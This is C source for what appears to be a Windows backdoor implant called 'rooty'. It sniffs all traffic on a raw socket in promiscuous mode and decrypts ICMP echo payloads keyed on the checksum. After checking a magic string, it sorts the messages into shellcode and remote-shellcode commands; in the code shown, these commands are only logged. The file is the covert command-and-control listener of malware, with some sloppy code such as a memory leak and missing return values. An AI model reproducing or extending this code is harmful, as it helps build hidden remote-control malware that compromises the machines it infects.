#include "rooty_win.h"

struct sockaddr_in source,dest;

int main(int argc, char *argv[]) {
   SOCKET s;
   WSADATA wsa;
   int in=0, rcv_all=3;

   struct in_addr addr;

   char hostname[100];
   struct hostent *local;

   LOG_DEBUG("Initializing Winsock.");
   if(WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
      LOG_ERROR("WSAStartup failed");
      return 1;
   }

   LOG_DEBUG("Creating socket.");
   if((s = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == INVALID_SOCKET) {
      LOG_ERROR("Failed to create raw socket");
      goto CLEANUP;
   }

   LOG_DEBUG("Getting hostname.");
   if(gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
      LOG_ERROR("gethostname failed.");
      goto CLEANUP;
   }

   LOG_DEBUG("Getting interfaces.");
   if((local = gethostbyname(hostname)) == NULL) {
      LOG_ERROR("Failed to get interface list.");
      goto CLEANUP;
   }

   // Interface can be listed on the command line
   if(argc == 2) {
      in = atoi(argv[1]);

      if((in < 0) || (in > 10)) {
         LOG_DEBUG("Invalid interface: %d.  Using default.", in);
         in = 0;
      }
   }

   for (int i = 0; local->h_addr_list[i] != 0; ++i) {
      memcpy(&addr, local->h_addr_list[i], sizeof(struct in_addr));
      LOG_DEBUG("Interface %d: %s", i, inet_ntoa(addr));
   }

   // Set up the arguments for the bind
   memset(&dest, 0, sizeof(dest));
   memcpy(&dest.sin_addr.s_addr,local->h_addr_list[in],sizeof(dest.sin_addr.s_addr));
   dest.sin_family = AF_INET;
   dest.sin_port = 0;

   LOG_DEBUG("Binding socket to %s.", inet_ntoa(dest.sin_addr));
   if((bind(s,(struct sockaddr *)&dest,sizeof(dest))) == SOCKET_ERROR) {
      LOG_ERROR("Failed to bind to interface %d.", in);
      goto CLEANUP;
   }

   LOG_DEBUG("Setting socket for sniffing.");
   if(WSAIoctl(s, SIO_RCVALL, &rcv_all, sizeof(rcv_all), 0, NULL, (LPDWORD)&in , 0 , 0) == SOCKET_ERROR) {
      LOG_ERROR("WSAIoctl failed.");
      goto CLEANUP;
   }
   
   LOG_DEBUG("Starting sniffer.");
   sniffer_loop(&s);

CLEANUP:
   LOG_DEBUG("Cleaning up.");

   int last_error = 0;
   if(last_error = WSAGetLastError()) {
      LOG_ERROR("%d", last_error);
   }
   WSACleanup();
   return 0;   
}

uint32_t sniffer_loop(SOCKET *s) {
   uint8_t buffer[65536];
   int bytes_read = 0;

   LOG_DEBUG("Sniffing packets"); 
   while((bytes_read = recvfrom(*s, (char *)buffer, sizeof(buffer), 0 , 0 , 0)) > 0) {
      process_packet((const uint8_t *)&buffer, bytes_read);
   }
}

uint32_t process_packet(const uint8_t *buffer, uint32_t len) {
   uint8_t *decrypted_data;
   struct in_addr source_address;

   IPV4_HDR *ip = (IPV4_HDR *)buffer;
   uint32_t ip_len = ((ip->ip_header_len & 0x0f) * 4);
   
   ICMP_HDR *icmp = (ICMP_HDR *)(buffer + sizeof(IPV4_HDR));
   uint32_t icmp_len = sizeof(ICMP_HDR);

   const uint8_t *data= buffer + ip_len + icmp_len;
   uint32_t data_len = len - ip_len - icmp_len;
   
   if((ip_len < len) && (ip->ip_protocol == IPPROTO_ICMP)) {
      source_address.s_addr = ip->ip_srcaddr;

      if(((ip_len + icmp_len < len)) && ((icmp->type == 8) && (icmp->code == 0))) {
         if(((ip_len + icmp_len + data_len) <= len) && ((data_len > 0) && (data_len < 5000))) {
            if((decrypted_data = (uint8_t *)malloc(data_len)) == NULL) {
               LOG_ERROR("Failed to malloc %d bytes for decrypted data.", data_len);
               return 1;
            }
            memset(decrypted_data, 0, data_len);
            
            if(decrypt_message(data, decrypted_data, data_len, (uint8_t *)&icmp->checksum) != data_len) {
               LOG_ERROR("Failed to decrypt received packet.");
               free(decrypted_data);
               return 1;
            }

            if(strncmp((const char *)decrypted_data, MAGIC, strlen(MAGIC)) != 0) {
               LOG_DEBUG("Received unknown packet.");
               return 1;
            }
            
            if(decrypted_data[6] & MESSAGE_WINDOWS_32) {
               if(decrypted_data[6] & MESSAGE_SHELLCODE) {
                  LOG_DEBUG("Received Windows shellcode message from %s", inet_ntoa(source_address));
               } else if(decrypted_data[6] & MESSAGE_REMOTE_SHELLCODE) {
                  LOG_DEBUG("Received Windows remote shellcode message from %s", inet_ntoa(source_address));
               } else {
                  LOG_DEBUG("Received an unknown Windows message from %s", inet_ntoa(source_address));
               }
            } else {
               LOG_DEBUG("Received an unknown message 0x%02x from %s", decrypted_data[6], inet_ntoa(source_address));
            }
         }
      }
   }
}

void hexdump(const char *buffer, uint32_t len) {
   char ascii[17];
   size_t i, j;
   ascii[16] = '\0';
   for (i = 0; i < len; ++i) {
      printf("%02X ", ((unsigned char*)buffer)[i]);
      if (((unsigned char*)buffer)[i] >= ' ' && ((unsigned char*)buffer)[i] <= '~') {
         ascii[i % 16] = ((unsigned char*)buffer)[i];
      } else {
         ascii[i % 16] = '.';
      }
      if ((i+1) % 8 == 0 || i+1 == len) {
         printf(" ");
         if ((i+1) % 16 == 0) {
            printf("|  %s \n", ascii);
         } else if (i+1 == len) {
            ascii[(i+1) % 16] = '\0';
            if ((i+1) % 16 <= 8) {
               printf(" ");
            }
            for (j = (i+1) % 16; j < 16; ++j) {
               printf("   ");
            }
            printf("|  %s \n", ascii);
         }
      }
   }
}
